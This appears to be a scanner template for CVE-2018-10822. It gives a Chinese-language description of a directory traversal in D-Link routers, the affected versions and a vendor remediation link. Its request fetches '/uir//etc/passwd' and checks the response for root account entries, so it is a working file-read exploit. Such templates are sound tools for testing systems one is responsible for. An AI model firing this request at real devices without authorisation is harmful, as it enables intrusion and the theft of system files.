id: CVE-2018-10822
info:
  name: D-Link Routers - Directory Traversal
  author:
  - l0ne1y
  description: |-
    D-Link路由器httpd server任意文件读取漏洞
    D-Link DWR-116等都是友讯（D-Link）公司的无线路由器产品。

    多款D-Link产品中的Web界面存在目录遍历漏洞。远程攻击者可通过将/..或//放置在‘GET /uir’之后并发送HTTP请求利用该漏洞读取任意文件。以下产品和版本受到影响：D-Link DWR-116 1.06及之前版本；DIR-140L 1.02及之前版本；DIR-640L 1.02及之前版本；DWR-512 2.02及之前版本；DWR-712 2.02及之前版本；DWR-912 2.02及之前版本；DWR-921 2.02及之前版本；DWR-111 1.01及之前版本。
  severity: high
  remediation: |-
    官方修复方案：
    1、建议用户到官方获取最新补丁或者最新版本程序：
    https://www.dlink.com/
requests:
- matchers:
  - type: regex
    regex:
    - 'root:.*:0:0:'
  - type: status
    status:
    - 200
  matchers-condition: and
  path:
  - '{{BaseURL}}/uir//etc/passwd'
  method: GET
